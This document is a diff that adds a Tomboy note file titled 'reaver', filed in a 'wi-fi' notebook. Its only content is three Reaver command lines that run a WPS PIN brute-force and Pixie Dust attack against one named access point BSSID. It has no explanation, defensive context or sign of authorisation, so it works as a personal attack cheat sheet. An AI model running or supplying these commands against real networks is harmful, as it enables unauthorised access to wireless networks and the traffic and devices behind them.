@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<note version="0.3" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy"><title>reaver</title><text xml:space="preserve"><note-content version="0.1" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size">reaver
+
+reaver -i wlan0 -b 3c:84:6a:97:5d:e2 -K
+reaver -i wlan0 -b 3c:84:6a:97:5d:e2 -vv -K 1
+reaver -i wlan0 -b 3c:84:6a:97:5d:e2 -vvv</note-content>
+</text><last-change-date>2022-12-30T05:54:30,069614Z</last-change-date><last-metadata-change-date>2022-12-30T05:54:30,069614Z</last-metadata-change-date><create-date>2022-12-30T05:54:27,465760Z</create-date><cursor-position>135</cursor-position><selection-bound-position>-1</selection-bound-position><width>705</width><height>816</height><tags><tag>system:notebook:wi-fi</tag></tags></note>
+
